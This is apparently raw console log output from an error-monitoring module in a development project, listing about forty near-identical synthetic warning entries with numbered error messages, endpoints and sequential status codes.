WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.892957Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3818'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893007Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3819'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893057Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3820'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893106Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3821'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893155Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3822'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893203Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3823'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893251Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3824'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893299Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3825'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893348Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3826'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893396Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3827'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893444Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3828'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893492Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3829'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893540Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3830'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893589Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3831'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893637Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3832'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893684Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3833'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893732Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3834'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893778Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3835'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893826Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3836'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893874Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3837'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893925Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3838'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.893972Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3839'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894020Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3840'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894070Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3841'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894123Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3842'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894176Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3843'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894280Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3844'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894359Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3845'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894417Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3846'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894469Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3847'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894570Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3848'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894640Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m77[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3849'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894695Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3850'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894747Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3851'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894826Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3852'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894905Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3853'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.894966Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3854'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895018Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3855'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895068Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3856'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.895116Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m78[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3857'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
